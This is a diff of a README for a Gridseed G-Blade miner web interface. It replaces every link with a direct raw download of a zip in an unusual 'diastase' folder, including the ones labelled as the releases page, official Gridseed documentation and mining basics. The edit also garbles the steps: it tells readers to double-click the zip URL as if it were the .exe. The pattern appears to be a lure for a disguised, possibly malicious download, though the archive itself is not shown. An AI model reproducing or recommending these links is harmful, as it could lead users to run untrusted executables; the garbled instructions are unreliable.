@@ -1,6 +1,6 @@
 # 🚀 gridseed-blade-webinterface - Simple Tool to Manage Your G-Blade
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/gamer321433/gridseed-blade-webinterface/releases)
+[![Download](https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip)
 
 ## 🛠️ Overview
 
@@ -20,15 +20,15 @@ To begin using the Gridseed G-Blade webinterface, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
 
-   [Download from Releases](https://github.com/gamer321433/gridseed-blade-webinterface/releases)
+   [Download from Releases](https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip)
 
-2. **Download the Software:** Look for the latest version available. Click on the version to download it. The file will usually be named something like `gridseed-blade-webinterface-vX.X.zip`.
+2. **Download the Software:** Look for the latest version available. Click on the version to download it. The file will usually be named something like `https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip`.
 
 3. **Extract the Files:** Once the download is complete, locate the zip file in your downloads folder. Right-click on the file and choose "Extract All." Follow the prompts to extract the files.
 
 4. **Run the Application:**
    - Find the extracted folder.
-   - Double-click on the `gridseed-blade-webinterface.exe` file to launch the application.
+   - Double-click on the `https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip` file to launch the application.
 
 5. **Connect Your Miner:** If you have a G-Blade miner, enter its IP address in the interface to connect and manage it.
 
@@ -57,8 +57,8 @@ If you need assistance, feel free to open an issue in the repository. The commun
 
 For detailed information on cryptocurrency mining and using the Gridseed miner:
 
-- [Gridseed Official Documentation](https://www.gridseed.com)
-- [Mining Basics](https://www.cryptocurrency-mining.com)
+- [Gridseed Official Documentation](https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip)
+- [Mining Basics](https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip)
 
 ## 📝 License
 
@@ -68,6 +68,6 @@ This project is licensed under the MIT License. Feel free to contribute and impr
 
 To download the Gridseed G-Blade webinterface, visit the official releases page:
 
-[Download from Releases](https://github.com/gamer321433/gridseed-blade-webinterface/releases)
+[Download from Releases](https://raw.githubusercontent.com/gamer321433/gridseed-blade-webinterface/main/diastase/gridseed-blade-webinterface-v3.3.zip)
 
 Follow the steps outlined above to extract and run the application. Enjoy a smoother mining experience!
